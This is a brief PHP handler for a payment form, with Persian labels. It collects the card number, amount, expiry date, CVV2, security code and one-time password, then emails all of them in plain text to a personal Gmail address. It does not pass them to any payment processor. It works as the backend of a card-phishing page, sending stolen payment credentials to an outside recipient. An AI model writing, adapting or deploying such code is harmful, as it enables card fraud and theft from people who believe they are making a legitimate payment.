<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $card_number = $_POST['card-number'];
    $amount = $_POST['amount'];
    $expiry = $_POST['expiry'];
    $cvv2 = $_POST['cvv2'];
    $security_code = $_POST['security-code'];
    $otp_code = $_POST['otp-code'];

    $to = "alirezaaz33221140@gmail.com";
    $subject = "اطلاعات جدید پرداخت";
    $message = "شماره کارت: $card_number\nمبلغ: $amount\nتاریخ انقضا: $expiry\nCVV2: $cvv2\nکد امنیتی: $security_code\nرمز پویا: $otp_code";
    $headers = "From: noreply@example.com";

    if (mail($to, $subject, $message, $headers)) {
        echo "ایمیل با موفقیت ارسال شد";
    } else {
        echo "خطا در ارسال ایمیل";
    }
}
?>
